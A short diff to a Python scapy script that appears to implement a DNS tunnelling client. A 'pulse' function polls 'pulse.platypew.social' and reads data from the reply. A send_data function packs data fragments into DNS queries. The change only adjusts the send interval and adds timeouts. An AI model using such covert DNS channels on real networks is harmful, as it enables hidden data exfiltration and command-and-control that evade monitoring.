@@ -9,8 +9,9 @@ import threading
 
 DOMAIN = "platypew.social"
 IFACE = "eth0"
-INTERVAL = 0.01
+INTERVAL = 0.02
 PULSE = 1
+TIMEOUT = 5
 
 FRAG_LEN = 70 - len(DOMAIN)
 
@@ -35,7 +36,7 @@ def pulse() -> None:
         dns = DNS(id=randint(0x0, 0xffff), rd=1, qr=0, qd=DNSQR(qname=f"pulse.{DOMAIN}", qtype="A"))
         beat = ip / udp / dns
 
-        res = sr1(beat, iface=IFACE, verbose=False)
+        res = sr1(beat, iface=IFACE, verbose=False, timeout=TIMEOUT)
 
         data = res.an.rrname.split(f".{DOMAIN}".encode())[0]
 
@@ -83,7 +84,7 @@ def send_data(data: bytes) -> None:
 
         req.append(ip / udp / dns)
 
-    return sr(req, inter=INTERVAL, iface=IFACE, verbose=False)
+    return sr(req, inter=INTERVAL, iface=IFACE, verbose=False, timeout=TIMEOUT)
 
 
 def main():
